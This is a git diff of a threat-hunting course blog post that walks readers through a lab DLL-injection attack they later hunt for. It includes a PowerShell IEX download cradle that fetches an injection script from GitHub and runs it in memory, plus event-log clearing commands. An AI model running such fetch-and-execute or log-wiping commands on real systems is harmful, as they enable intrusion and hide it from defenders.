@@ -1,6 +1,6 @@
 ---
 title: "Threat Hunting for Beginners: Hunting Standard Dll-Injected C2 Implants (Practical Course)"
-date: 2023-07-12T02:01:58+05:30
+date: 2023-08-12T02:01:58+05:30
 description: "In this beginner-friendly practical course we'll learn how to threat hunt standard DLL-injected C2 implants. We'll set up our own virtual environment, perform the attack, perform our threat hunting analysis, as well as write a report on our findings."
 tags: [threat_hunting, C2, dll_injection_attacks]
 author: "faan|ross"
@@ -725,7 +725,7 @@ Alright, since we are now literally about to pull the trigger, let's hit the rec
 
 First off we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below.Once you've identified it, simply double-click on it, this then starts the recording. 
 
-{{< figure src="/img/image036.png" title="" class="custom-figure" >}}
+{{< figure src="/img/image036.png" title="" class="custom-figure-3" >}}
 
 One other thing, right before we start our attack I also want to clear both logs we activated - `Sysmon` and `PowerShell ScriptBlock`. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start anew so our final capture is spared all this noise. 
 
@@ -739,44 +739,46 @@ wevtutil cl "Microsoft-Windows-PowerShell/Operational"
 
 # 2.3.4. Preparing Our Injection Script
 
-Next we need to perform a bit of *Macgyvering*...
+First, we need to perform a bit of *Macgyvering*...
 
 {{< figure src="/img/macgyver.gif" title="" class="custom-figure" >}}
 
-So above in `2.3.2` we created the malicious DLL (`evil.dll`). But of course, now we need a script to actually inject the DLL into a running process. One of the most popular scripts to do perform this is called [Invoke-DllInjection.ps1.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
+Above in `2.3.2` we created the malicious DLL (`evil.dll`). But of course, now we need a script to actually inject the DLL into a running process. One of the most popular scripts to do perform this is called [Invoke-DllInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1) from the [PowerShell Mafia](https://github.com/PowerShellMafia/PowerSploit). 
 
-The code as it currently stands on the original repo is however broken, at least when I tried it (in multiple configurations). The script has not been updated in a few years, and since it's also been archived it's unlikely it ever will be - the original authors have since moved on to bigger things. 
+The code as it currently stands on the original repo is however broken, at least when I tried it using multiple configurations. The script has not been updated in a few years, and since it's also been archived it's unlikely it ever will be - the original authors have since moved on to bigger things. 
 
 The good news though is I found a simple fix and have updated the script which is now being hosted on [my github repo here](https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1).
 
-And thus, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but **in no way whatsoever do I want to appear as taking any credit/ownership for it**. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 
+And so, just so you are aware, we are going to download and inject into memory the script directly from my personal Github repo but `in no way whatsoever do I want to appear as taking any credit/ownership for it`. The original link, as well as a reference to where I found the fix, can be found in the opening comments in the script itself, feel free to refer to them if you want. 
 
-
-
-
-
-everything is setup, so we are ready to run or first attack command. 
-
-
-
-
-
-
-
-
-1. Back on our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
-
-{{< figure src="/img/image047.png" title="" class="custom-figure" >}}
-
-2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a webserver and then inject it directly into memory. This is a good example of what living off the land is all about - utilizing everyday components while not leaving any residue on the hard drive. 
-
+**OK, so now let's go ahead and download + inject the script into memory:**
+1. On our Windows VM we'll open an administrative PowerShell terminal - a reminder that in order to do so you have to right-click on PowerShell and select `Run as Administrator`. 
+2. Now we'll run the following command, as mentioned before: it's going to download a script hosted on a web server (GitHub in this case) and then inject it directly into memory. 
 ```
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
 ```
+- Note that after you run it there won't be any feedback/output. You see, PowerShell is rather stoic -  not receiving any feedback/output almost always means the command ran successfully. Conversely, if there was an error, you'll get some red text telling you what went wrong. 
 
-Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 
 
-Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.
+
+tk xxx cont here
+
+
+
+
+
+
+
+
+# 2.3.5. Injecting Our Malicious DLL
+
+Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, we've not yet executed it. 
+
+We're about to do so, but before that there's one more thing we need. Remember in the beginning when I explained how DLL-injections work I said that we "trick" a legit process into running code from a malicious DLL? So this script we just injected into memory is what's going to be doing the trickery, we also have our malicious DLL which we transferred over, so that means we only need one more thing - a legit process.
+
+
+
+
 
 Now it used to be the case that you could easily inject into any process, including native Windows processes like notepad and calculator. You'll notice if you do some older tutorials, they'll almost always choose one of these two as the example. However, though there are potential workarounds, this has become more ciomplicated since Windows 10 - if you're curious to know why [see here.](https://security.stackexchange.com/questions/197409/why-doesnt-dll-injection-works-on-windows-10-for-native-windows-binaries-e-g)
 
